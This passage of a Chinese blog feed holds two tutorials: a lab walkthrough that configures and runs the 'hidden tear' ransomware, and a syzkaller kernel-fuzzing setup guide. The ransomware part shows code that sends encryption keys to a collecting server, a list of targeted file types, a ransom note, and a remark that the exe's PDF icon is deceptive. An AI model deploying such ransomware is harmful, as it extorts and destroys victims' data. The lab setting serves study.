<li><p>在服务器通过<code>ifconfig</code>查看 ip 地址<code>192.168.37.137</code><br><img src="/2021/11/26/hidden_tear/image-20211126085804614.png" alt="image-20211126085804614"></p>
</li>
<li><p>网站目录下编写<code>keys.php</code>文件用来接收秘钥<br><img src="/2021/11/26/hidden_tear/image-20211126085957698.png" alt="image-20211126085957698"></p>
</li>
<li><p>测试是否成功，访问<code>192.168.37.137/keys.php?info=1111</code> 或者<code>?info=2222</code><br><img src="/2021/11/26/hidden_tear/image-20211126090152430.png" alt="image-20211126090152430"></p>
</li>
<li><p>web server 搭建完成之后，我们需要再准备一个加密程序，下面列出需要修改的变量</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//web server 以及相关 Url 服务</span><br><span class="line">string targetURL = &quot;http://192.168.37.137/keys.php?info=&quot;;</span><br><span class="line"></span><br><span class="line">//将被加密的文件的后缀</span><br><span class="line">var validExtensions = new[]</span><br><span class="line">&#123;</span><br><span class="line">	&quot;.txt&quot;, &quot;.doc&quot;, &quot;.docx&quot;, &quot;.xls&quot;, &quot;.xlsx&quot;, &quot;.ppt&quot;, &quot;.pptx&quot;, &quot;.odt&quot;, &quot;.jpg&quot;, &quot;.png&quot;, &quot;.csv&quot;, &quot;.sql&quot;, &quot;.mdb&quot;, &quot;.sln&quot;, &quot;.php&quot;, &quot;.asp&quot;, &quot;.aspx&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.psd&quot;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line">//加密后给受害者留下来的提示信息，保存在C:\\User\\[username]\\Desktop\\test\\READ_IT.txt</span><br><span class="line">public void messageCreator()</span><br><span class="line">&#123;</span><br><span class="line">	string path = &quot;\\Desktop\\test\\READ_IT.txt&quot;;  //文件名</span><br><span class="line">	string fullpath = userDir + userName + path;</span><br><span class="line">	string[] lines = &#123; &quot;Files has been encrypted with hidden tear&quot;, &quot;Send me some bitcoins or kebab&quot;, &quot;And I also hate night clubs, desserts, being drunk.&quot; &#125;;  //文件信息</span><br><span class="line">	System.IO.File.WriteAllLines(fullpath, lines);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>保存之后<code>build</code>-&gt;<code>build solution</code>，在<code>hidden-tear\hidden-tear\bin\Debug</code>目录下面找到<code>hidden-tear.exe</code>文件，图标是一个<code>pdf</code>，很有迷惑性。<br><img src="/2021/11/26/hidden_tear/image-20211126093147818.png" alt="image-20211126093147818"></li>
<li>准备一台windows 8.1虚拟机作为victim，在<code>\\Desktop\\test</code>目录下面创建<code>hello.txt</code><br><img src="/2021/11/26/hidden_tear/image-20211126093456021.png" alt="image-20211126093456021"></li>
<li>使用<code>hidden-tear.exe</code>进行攻击，可以看到<code>hello.txt</code>已经被加密修改成了<code>hello.txt.txt.loacked</code><br><img src="/2021/11/26/hidden_tear/image-20211126093559776.png" alt="image-20211126093559776"><br><img src="/2021/11/26/hidden_tear/image-20211126093721238.png" alt="image-20211126093721238"><br><img src="/2021/11/26/hidden_tear/image-20211126093751151.png" alt="image-20211126093751151"></li>
<li>使用解密器进行解密，需要我们服务器接收到的秘钥（每次接收一行）<br><img src="/2021/11/26/hidden_tear/image-20211126093854101.png" alt="image-20211126093854101"></li>
<li>解密成功，重新变成<code>hello.txt</code><br><img src="/2021/11/26/hidden_tear/image-20211126094119314.png" alt="image-20211126094119314"></li>
</ol>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2>]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>software security</tag>
      </tags>
  </entry>
  <entry>
    <title>syzkaller入门</title>
    <url>/2021/11/28/syzkaller%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="syzkaller-入门"><a href="#syzkaller-入门" class="headerlink" title="syzkaller 入门"></a>syzkaller 入门</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>用户通过 syscall 来访问操作系统提供的功能和资源，syzkaller 专门用来测试那些内核系统调用实现（简称syscall）中的bug。</p>
<p>Fuzzing 是一种自动化的方法，它将随机值作为输入提供给一个软件，希望能够发现开发者未曾尝试过的有问题的输入组合导致的错误。</p>
<p>syzkaller 不会盲目地生成测试输入，我们通过描述 syscall 的参数期望被如何使用来限制我们的集合。通过这样做，我们可以利用可用资源在更大的调用集上提供随机测试。</p>
<p>用到的另一个 fuzzing 优化技术被叫做代码覆盖率引导的 fuzzing。这项技术测量每个输入所实现的代码覆盖率，尝试让输入的代码覆盖率最大。每个增加代码覆盖率的输入都会被变异，以便增加测试的总体范围（即访问更多函数，分支）。对于一个 fuzz 目标的输入集被称为语料库（即原始的测试用例）。</p>
<p>Syzkaller是一个无监督的内核 fuzzer ，它使用上述两种技术fuzz Syscalls。</p>
<p>在这篇文章中，我将分享我的一些使用经验。</p>
<p>项目地址：<a href="https://github.com/google/syzkaller">google/syzkaller: syzkaller is an unsupervised coverage-guided kernel fuzzer (github.com)</a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装主要参照 syzkaller 官方文档：<a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup.md">syzkaller/setup.md at master · google/syzkaller (github.com)</a></p>
<p>环境：</p>
<ul>
<li>vmware虚拟机：Ubuntu 20.04</li>
<li>请确保有足够的空间（40 G 空间可以，但是不要放在机械硬盘里面，虚拟机会很慢）</li>
</ul>
<p>使用 syzkaller 需要以下组件：</p>
<ul>
<li>Go compiler and syzkaller itself</li>
<li>C compiler with coverage support</li>
<li>Linux kernel with coverage additions</li>
<li>Virtual machine or a physical device</li>
</ul>
<h3 id="Ubuntu-host-需要的依赖"><a href="#Ubuntu-host-需要的依赖" class="headerlink" title="Ubuntu host 需要的依赖"></a>Ubuntu host 需要的依赖</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install make gcc flex bison libncurses-dev libelf-dev libssl-dev</span><br></pre></td></tr></table></figure>

<h3 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h3><p>syzkaller 基于 Go 语言编写，为了编译它我们需要 Go 环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://dl.google.com/go/go1.14.2.linux-amd64.tar.gz</span><br><span class="line">tar -xf go1.14.2.linux-amd64.tar.gz</span><br><span class="line">mv go goroot</span><br><span class="line">mkdir gopath</span><br><span class="line"><span class="built_in">export</span> GOPATH=`<span class="built_in">pwd</span>`/gopath</span><br><span class="line"><span class="built_in">export</span> GOROOT=`<span class="built_in">pwd</span>`/goroot</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$GOPATH</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$GOROOT</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<h3 id="编译-syzkaller"><a href="#编译-syzkaller" class="headerlink" title="编译 syzkaller"></a>编译 syzkaller</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go get -u -d github.com/google/syzkaller/prog</span><br><span class="line"><span class="built_in">cd</span> gopath/src/github.com/google/syzkaller/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h3 id="编译-kernel"><a href="#编译-kernel" class="headerlink" title="编译 kernel"></a>编译 kernel</h3><p>Linux Kernel 源码下载（<code>$KERNEL</code> 替换为你想要的目录）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --branch v5.14 git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git <span class="variable">$KERNEL</span></span><br></pre></td></tr></table></figure>

<p>这里我们采用官方文档提供的 git 方式下载 5.14版本的内核，这种方式下载会比较慢，好处是获取不同版本的内核也很方便，方便管理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make kernelversion  <span class="comment"># 查看内核版本</span></span><br><span class="line">git tag             <span class="comment"># 查看tag（是一个固化的分支）</span></span><br><span class="line">git checkout v4.17  <span class="comment"># 切换到4.17版本的内核源码</span></span><br></pre></td></tr></table></figure>

<p>生成默认配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$KERNEL</span></span><br><span class="line">make defconfig         <span class="comment"># 生成默认配置文件.config</span></span><br><span class="line">make kvm_guest.config  <span class="comment"># kvm配置</span></span><br></pre></td></tr></table></figure>

<p>开启必要的内核配置选项以启动syzkaller，在<code>.config</code>文件末尾添加如下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Coverage collection.</span></span><br><span class="line">CONFIG_KCOV=y</span><br><span class="line"></span><br><span class="line"><span class="comment"># Debug info for symbolization.</span></span><br><span class="line">CONFIG_DEBUG_INFO=y</span><br><span class="line"></span><br><span class="line"><span class="comment"># Memory bug detector</span></span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br><span class="line"></span><br><span class="line"><span class="comment"># Required for Debian Stretch</span></span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译内核，这个过程会比较漫长</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make olddefconfig    <span class="comment"># 将当前内核源码的新特性加入.config中去</span></span><br><span class="line">make -j`nproc`       <span class="comment"># 开始编译</span></span><br></pre></td></tr></table></figure>

<p>出现<code>Kernel: arch/x86/boot/bzImage is ready  (#3)</code>标志已经完成。</p>
<p>也可以以下命令查看是否成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls <span class="variable">$KERNEL</span>/vmlinux</span><br><span class="line"><span class="comment"># sample output - $KERNEL/vmlinux</span></span><br><span class="line">ls <span class="variable">$KERNEL</span>/arch/x86/boot/bzImage</span><br><span class="line"><span class="comment"># sample output - $KERNEL/arch/x86/boot/bzImage</span></span><br></pre></td></tr></table></figure>

<h3 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h3><p>安装<code>debootstrap</code>工具，可以用来构建最基本的系统。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install debootstrap</span><br></pre></td></tr></table></figure>

<p>创建 Debian Stretch Linux 镜像，<code>$IMAGE</code> 替换为你想要的目录，执行以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir <span class="variable">$IMAGE</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$IMAGE</span>/</span><br><span class="line">wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh</span><br><span class="line">chmod +x create-image.sh</span><br><span class="line">./create-image.sh</span><br></pre></td></tr></table></figure>

<p>完成后应该可以找到<code>$IMAGE/stretch.img</code> 这个文件就是构建好的磁盘镜像文件</p>
<p>或者创建 Debian Buster Linux 镜像，执行以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./create-image.sh --distribution buster</span><br></pre></td></tr></table></figure>

<p>安装额外的工具，一些在VM中有用的包和工具</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./create-image.sh --feature full  <span class="comment"># 要安装一组我们认为有用的工具，请执行(请随意编辑脚本中的工具列表) </span></span><br><span class="line">./create-image.sh --add-perf      <span class="comment"># 要安装perf（不需要运行syzkaller；需要$kernel指向内核源）：</span></span><br></pre></td></tr></table></figure>

<p>问题：我在这一步因为空间不够导致报错</p>
<p>如果想要去删除这个镜像，重新安装，在<code>$IMAGE</code>目录下面不能成功删除<code>chroot/</code>，需要在<code>/mnt/</code>目录下面删除。</p>
<h3 id="安装-QEMU"><a href="#安装-QEMU" class="headerlink" title="安装 QEMU"></a>安装 QEMU</h3><p>使用以下命令安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install qemu-system-x86</span><br></pre></td></tr></table></figure>

<p>在 VMware 上使用 Linux 则应当在设置中把 <code>虚拟化 Intel VT-x/EPT 或 AMD-V/RVI(V)</code> 打开</p>
<p>如果安装过 windows docker 或者 wsl2 的需要关闭hype-v，这会导致 docker 和 wsl 2 不能正常工作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> hypervisorlaunchtype off  <span class="comment"># 以管理员身份运行命令提示符执行命令，彻底关闭hype-v</span></span><br></pre></td></tr></table></figure>

<p>验证内核是否能够启动（注意<code>$KERNEL</code>和<code>IMAGE</code>的路径）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-m 2G \</span><br><span class="line">	-smp 2 \</span><br><span class="line">	-kernel <span class="variable">$KERNEL</span>/arch/x86/boot/bzImage \</span><br><span class="line">	-append <span class="string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot;</span> \</span><br><span class="line">	-drive file=<span class="variable">$IMAGE</span>/stretch.img,format=raw \</span><br><span class="line">	-net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \</span><br><span class="line">	-net nic,model=e1000 \</span><br><span class="line">	-enable-kvm \</span><br><span class="line">	-nographic \</span><br><span class="line">	-pidfile vm.pid \</span><br><span class="line">	2&gt;&amp;1 | tee vm.log</span><br></pre></td></tr></table></figure>

<p>以 root 账户登录，没有密码</p>
<p><img src="/2021/11/28/syzkaller%E5%85%A5%E9%97%A8/image-20211205114827224.png" alt="image-20211205114827224"></p>
<p>在另一个 shell 中验证是否能 ssh 连接虚拟机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -i <span class="variable">$IMAGE</span>/stretch.id_rsa -p 10021 -o <span class="string">&quot;StrictHostKeyChecking no&quot;</span> root@localhost</span><br></pre></td></tr></table></figure>

<p>关闭正在运行中的<code>QWMU</code>实例：</p>
<ol>
<li>按下<code>Ctrl + A</code>然后<code>x</code></li>
<li>或者使用命令：<code>kill $(cat vm.pid)</code></li>
</ol>
<p>验证QEMU工作，内核启动并且ssh也可以连接之后，我们可以关闭QEMU然后尝试去运行syzkaller了</p>
<h3 id="配置-syzkaller-并尝试运行"><a href="#配置-syzkaller-并尝试运行" class="headerlink" title="配置 syzkaller 并尝试运行"></a>配置 syzkaller 并尝试运行</h3><p>我们需要为 syzkaller 编写额外的配置文件<code>my.cfg</code>，这里需要注意替换环境变量为你自己的路径：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;target&quot;</span>: <span class="string">&quot;linux/amd64&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:56741&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;workdir&quot;</span>: <span class="string">&quot;$GOPATH/src/github.com/google/syzkaller/workdir&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;kernel_obj&quot;</span>: <span class="string">&quot;$KERNEL&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;image&quot;</span>: <span class="string">&quot;$IMAGE/stretch.img&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;sshkey&quot;</span>: <span class="string">&quot;$IMAGE/stretch.id_rsa&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;syzkaller&quot;</span>: <span class="string">&quot;$GOPATH/src/github.com/google/syzkaller&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;procs&quot;</span>: <span class="number">8</span>,</span><br><span class="line">	<span class="attr">&quot;type&quot;</span>: <span class="string">&quot;qemu&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;vm&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;count&quot;</span>: <span class="number">4</span>,</span><br><span class="line">		<span class="attr">&quot;kernel&quot;</span>: <span class="string">&quot;$KERNEL/arch/x86/boot/bzImage&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;cpu&quot;</span>: <span class="number">2</span>,</span><br><span class="line">		<span class="attr">&quot;mem&quot;</span>: <span class="number">2048</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>$GOPATH/src/github.com/google/syzkaller/</code>目录下，运行 syzkaller manage：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir workdir                      <span class="comment"># workdir 是配置文件里面填的工作目录</span></span><br><span class="line">./bin/syz-manager -config=my.cfg   <span class="comment"># my.cfg  是额外的配置文件的名字</span></span><br></pre></td></tr></table></figure>

<p>启动成功后，我们可以通过访问 <code>localhost:56741</code> 来获取 syzkaller 的状态</p>
<p><img src="/2021/11/28/syzkaller%E5%85%A5%E9%97%A8/image-20211205125050369.png" alt="image-20211205125050369"></p>
<p>问题：qemu崩溃，报错如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64: error: failed to <span class="built_in">set</span> MSR 0x48b to 0x159ff00000000</span><br><span class="line">qemu-system-x86_64: /build/qemu-EmNSP4/qemu-4.2/target/i386/kvm.c:2947: kvm_put_msrs: Assertion `ret == cpu-&gt;kvm_msr_buf-&gt;nmsrs<span class="string">&#x27; failed.</span></span><br></pre></td></tr></table></figure>

<p>最简单的解决方法是在 syz-manager 配置文件中将<code>qemu_args</code>设置为<code>-enable-kvm</code>：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;target&quot;</span>: <span class="string">&quot;linux/amd64&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:56741&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;workdir&quot;</span>: <span class="string">&quot;$GOPATH/src/github.com/google/syzkaller/workdir&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;kernel_obj&quot;</span>: <span class="string">&quot;$KERNEL&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;image&quot;</span>: <span class="string">&quot;$IMAGE/stretch.img&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;sshkey&quot;</span>: <span class="string">&quot;$IMAGE/stretch.id_rsa&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;syzkaller&quot;</span>: <span class="string">&quot;$GOPATH/src/github.com/google/syzkaller&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;procs&quot;</span>: <span class="number">8</span>,</span><br><span class="line">	<span class="attr">&quot;type&quot;</span>: <span class="string">&quot;qemu&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;vm&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;count&quot;</span>: <span class="number">4</span>,</span><br><span class="line">		<span class="attr">&quot;kernel&quot;</span>: <span class="string">&quot;$KERNEL/arch/x86/boot/bzImage&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;cpu&quot;</span>: <span class="number">2</span>,</span><br><span class="line">		<span class="attr">&quot;mem&quot;</span>: <span class="number">2048</span>,</span><br><span class="line">        <span class="attr">&quot;qemu_args&quot;</span>: <span class="string">&quot;-enable-kvm&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="syzkaller-如何工作"><a href="#syzkaller-如何工作" class="headerlink" title="syzkaller 如何工作"></a>syzkaller 如何工作</h2><p>syzkaller系统的流程结构如下图所示，红色标签表示相应的配置选项。</p>
<p><img src="/2021/11/28/syzkaller%E5%85%A5%E9%97%A8/process_structure-16386838438732.png" alt="Process structure for syzkaller"></p>
<ul>
<li><code>syz-manager</code> ：控制整个 syzkaller 模糊测试系统<ul>
<li>启动、监视并且重启多个虚拟机，并在这些虚拟机里面通过<code>sshd</code>调用<code>syz-fuzzer</code></li>
<li>使用<code>RPC</code>与虚拟机中的<code>syz-fuzzer</code>交流实现的覆盖率和fuzzing过程中的任何跟踪信息，比如crash和corpus.。</li>
<li>将得到的信息存储在本地<code>workdir</code>目录下</li>
<li>通过设置<code>http</code>公开一个基于web的界面，在这个界面可以浏览存储的信息</li>
</ul>
</li>
<li><code>syz-fuzzer</code> ：负责引导整个 fuzz 的过程：<ul>
<li>输入的生成，变异，语料最小化等。</li>
<li>启动 <code>syz-executor</code> 进程进行 fuzz</li>
<li>从被 fuzz 的 kernel 的 <code>/sys/kernel/debug/kcov</code> 获得覆盖的相关信息</li>
<li>通过<code>RPC</code>将触发新代码覆盖的输入发送回<code>syz-manager</code></li>
</ul>
</li>
<li><code>syz-executor</code>：负责执行单个输入（一系列 syscalls）<ul>
<li>从<code>syz-fuzzer</code>接收程序并执行，然后返回结果</li>
<li>它被设计为尽可能简单（为了不干扰 fuzzing 进程），用C++编写，编译为静态二进制，并使用共享内存进行通信。</li>
</ul>
</li>
</ul>
<h2 id="描述-syscalls"><a href="#描述-syscalls" class="headerlink" title="描述 syscalls"></a>描述 syscalls</h2><p><code>syz-fuzzer</code>进程根据描述的 syscalls 生成由<code>syz-executor</code>执行的程序。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>简历</title>
    <url>/2021/12/06/sunruijiang/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="768b0990a3a832845b56dfb67c8e1f0aa04a1edc0aadbd5692fa82e17ca74665">b0bb00e0b67360894bf5193cb955669168551f9afa8273643671f35fcda219d194dc6419f9970ea98e924da97cd9e607e5b05eb55ebf206cefff9d199f5f8042ddfddeb2dc3bdfdec2aa4a78cbc4ebf7ff1034c2f917ceab0b6d1bdef2e85cae369f9cbffcf52526dc557ce822f06a757ce5d5b7f8df8699f3f79c0c9336f1e7a0f2c111e3c8947942b8017c1451791317f69b3777ab92092391ac9e121d68efd474224c9e68e11a70e03ab76f761227fdc22ad995409a18599272e7abf2058cb6bf1179107435261d84bced23f102ffde72ee2a0ddf76c66aed7e44e2624055d4e4e7c5f6a0fa4f86d7a7a8984d28161713d0328c372d433492807f5744731d4b2d1882a4c2038e50c9041c104f96e8266553ea77f96e33087d95da24a659ac4a82721ee49954235be3c96ef272c6f76fd620278c4097c0815ed0b1a1f4ab6ef86bf884aa069c939764359bd1103f2e9860886c890ec8b3aba893f94ecddd43fe9b8da7ab39f8356d17a3f732e676b8b3ff2f4784fc679a5752faffaac3dab18a36671cba873c14047b3ef0eefa841967e5ee4a182ca591b9374ca33379dfed680a2989c8e6636b5fd2bb619c037e9b57696000c4d799b17de601f23915d21f6e3772f278a25c87b9f793850b379675efcb8d7ec07449a7b79caf01f82977675e4d1e67fefb8147a55beebffa6f56ff5c488ab7e33e67e756c10a7a5bd48b26544f185f3216b37df159234f0c51e9f713379d0b556b7285b060e5d67288cfb589aa7d27b7a4e6c00f4cf77dc121fd27e66b2fc13e2a7574a6a58b6cb02a26ea3d0028bc72067ea0577ce9d86144b29de12dfd3bf40613fe9546325ec057eb332bbe9aeea83fd860d622056b0fe0639198c221e6663b92bcbcb8214df4ffa515c8ee1f92e17dd538563028624e101c0709364ea15c2c44fc726f6040fdf9f200ec3770d2be2d26420f5b201cb9e6495f9267ff5d8fd9ffb04b4310e1f7f75657498840be1c81789d708cea204992ba79dd05108e0c50db09809387e1adead3a2d2f95724f21f05f4c91a41357d9151590c6e244ff27b0174c96ae768fd30b932438f00b75d9e722d0d7b2282a20f69bb84103339e61d2c01ef358f13a7a3daae8b9f948d6230194230b8eb0675a23f088715ab350a450b53a4f6a98bbc0f18b526abfe907c1e3cd7184cf36dd372701fa697ea545fcaec2630534eabfa73cd644444d1531aa5f9065930343e315af0c333ac5fd974793ffdc449df4fa0167d51210e2938d83d51888223d1b032b660494b2c79c8916cff165e2787ad2d763e0a45c384e50156d7bb5aad5cfc8e00100d95ee50645b447096c923e32da8ee4a6219b88ce9dadebde465f36e703f3544ba383042eb6bfdd30e5131b7b0299038ae703a9abcafc57e1a00aab492e8b4c5786b6d33236e8bc30d5989cb00bb7c8a6de1cedc754c783616ce838638b7add721d6e6d26a123a3799accb0bd2beacc166e780db8ebcfb747d9e856ca4e7c43ee04f124273b92c3bcb7b80af642648248777d5633b9d057a1210a9a4580525afe6de4b08f705540e1c427626d6ae7959cf18e176cb9dd66eadf9690ed7232a9585593b2ddfa4ee9d8dbf35c6c59d3b9119b5ad1f9d7751ba78e5fa7c1a33f0c145150830aa47624d1621bbecd233688d130f625a74e6533ef39906e0db2f63a07a3633fa5f9e8cbc810610a11464708e346cbf8d57a000a4c366044172018b40bb297b044daacfcc769fb6bcc65a229de2138c4826ab8a6585495e5225363cac36426d7b5b1b59dcb0a74b81958ba82bed30178a372ef5160161c50db04d56c51b6333012e92bbfa1bc30e945bfdef9d5b664fd3a13dc14943a0213fee16ddd543c507e042fbf46ad6500586156e0e6c8f06e535318c9d70ad02da2432d8e4413279cab09215a26aa456ee4e0c68a8086ce0dbc0a81adcefa08807c0f59e8fa43823ecb5204957f9dafbaf503706a30698112b48b9ac4ecc92d307aea90c826a0ae05efbc75664244279f7e5ead169645ae13b19aa46066bc8d9b4bf929176efc987f9d1adce0cf8b71760ad39d91e6cf4b1df0906ed15261aa04abdf7235af3550868aaf63223e5b4b78c99fdb077f9f8c5fe4cf62486fdcb5f44573ef5fc0bf2599603a5409dee585a285046325d7cd25ba7d499c62b35be76493e642e700300cacdf46dbf74aae91dc98e2f7de49673748d56b9f139e6887d012da84c3cd771728ded0f9194852f8fc55a4c31ca9db48fa4ead998ceb7ced7b8c177ce5ba307f2253afe88efc7cd0f69484502296ca6e001485615e5e317e376b2793df98b0f2ac5388f64d926759f2bc3a1f186fa7e0cc74386c0d82126a90a22ce555a5cbc81d8b4e3ec25671c01e19924c989bf102d3e355eca2817b87c1a0e044f0d29cc7b8ba10854fd9f7a08fae65866dd290254830b2efdf02ac53063dd28f26b7d0f9c7abc8bf15deb348aacbe8121a91c9e3e76f6366702e925949942d1e5bbef58c59a3a4b3db62ce3788922a822b74f2c215e876cb7043ab76670c44a1f3851decb6272e46e8e975c132340b6f42a3068260e0fb460568353687f06b63701c77ec6c0595dfb846abfeb039d4935d51df24a87792f86551e96297c6bd5f59765312f7246e131196bc0f94255faa80dd9d3d5e7fb283ab46ee0cc129100759580fce5200f6e4a0f2a20cd749ceb25cefc5e8b5f2982cca233353c94194a379cabc7b75a9405ec6cc6e5037580a116a6c390845bde66545aa87c0335258ddcbc31464be0bfb61532200019ab1f5b84eeb779a8bfe50d3323d30c721de778f74a2727f227aa8c745cc0c0be891c82b3e1169d6aed4c8a5d391247925794c9c679210203022821050d1d5869d3871b96dc75f5280923f2d0dd555a17e0a7f79220bd48a20bf98c44558e0cb55e63dc43617c6bade55afc7de49acafe3da1e806b530eca9d5fd5479bb8f8f082d46de89fd3bfd9b1e4841c7243156e11961222953eeccbc1409e0a46cafecdca99e504e8d6521c6069c842f2396edf1e4d229c111682e4ee40ad2f743679883f8b6ee42b43b787335b5a055f2dc6cb0c3f7d6a1dfdae02f6e8031eac6f0704c823b8774e826117047db724e54b732613eedd57a70ad68145d324cd77aaa3c7ef3f9a55f41d39f434c2c4eb1972715330d9c293455276e4491d1783555067ba514e56a43898254432247313e36c605d3512b6d061bf1ab4f6e6f2c8da4560b6a6683f65b491d9ebbb0f24258e6a7e2d57618b0ec6e6de6db690565c32b62b732eddd748b1189bb064ae57373ee3ca395426381cb97216753733ab6570cf90762fc327415f36dec526b1d2bd8549152f23860febb2f91276b59114767849285218f0e74e09b9aa3f0aca4c3873cf8f1525d2f0b02b864f0604a188360a2e86d3101be8e5ba9e874d13f76e88c053b184f504e27c4e1bbf356676ec10b126112ce341ca12b95e1f95f0676f377422353b72f9233eb595aa8656312e7b38334c26cba2990eff5b31337ac22a6164adb247a261fe0baaa978e03771ceb10827fd34c78168dc5fd30b26e03f7c4d82c6cf456687ee2d571309baae6ef380de7f0a481ca8cb6e862ab590088b882d6fa8883d8cab7e513248c1911dacb566bd7651d54b06bf693ac87009ff0405dec11dce2be6808206ee3f2ba64e0c06ddd10d4d2825478d62110625a53191cdc86eddb52207259a81e3497180caed4ce7a5a8330df8c5f631494bd4eb6c29de0b1bdb81cda43d7d31fc7b62d0caeaaec577186fe1eb1b4fd283b3f700268b8a3129eebb6cedc3ccb387d341cf57dabb3eba876cf7f3d05c6eaf4d910169c6483f3af0e5347255b81e8a6cb641bb1781094ab23968d2e1798f8a99e15f2928a7c788cd2790a83d3e6ed4206106a5289e3d565f78ed6f18e74d11edb29d9d7b0e7fe842372c0458a99a791ed10cd192cc0efc5d506aa6f5b8f3c96a3a4552217f50ebd78eeb3922370246bee782fe0f827932fb9ec511ae1fe417bbf48849788997c91945e21e027a4f0758a84412138cee3918cdb0f670b047426d7095efccb7008a75a609a9d6b5c3557184dc13b2f56ecf389253d57674106aa96f82959e7b196a816305fcdbff6663bbe4970e6715588c5d7fc8f75691af8f94620d50fa486848ee127a37ec652517fa61ea337dd1de2862b36b2d5f20d350d294ba0285c2cb70d2a241749138f0da0752f64bd4051101c46742e2da405c221817bbfa592e6c69de51c689b705ef6ca307dadedac17a1bf8f79118a878ea1b06362a7e49c1338712308fc84d91ca70f7fd37ed18b59b612e7f5c1b66fe5abb71f5176f90503f3a67f0da7fe0aab3b83da0e8cadea6a8cbac44e7d87c0d60f9cbef89a2d0f55a4f8eeeb15abbead7f699c2c871833420f46de2b750ace7da6cc5335e7e2d9728efce16e4a08bd19824cdda9da1651ef4cc1af5dc0bf3e8f7fda8b47487563bb17c428c901e27d918e89f6f27b53c3eec9e7b15b389d8